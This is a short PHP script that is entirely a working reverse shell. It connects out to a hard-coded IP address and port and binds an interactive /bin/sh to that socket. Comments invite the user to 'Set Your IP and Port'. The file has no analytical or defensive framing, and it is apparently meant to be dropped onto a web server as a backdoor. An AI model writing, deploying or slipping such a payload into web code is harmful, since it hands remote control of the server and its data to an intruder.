<?php
// Set Your IP and Port
$ip = '192.168.1.10';  
$port = 1234;      

// Open Connection on Your Machine
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);

?>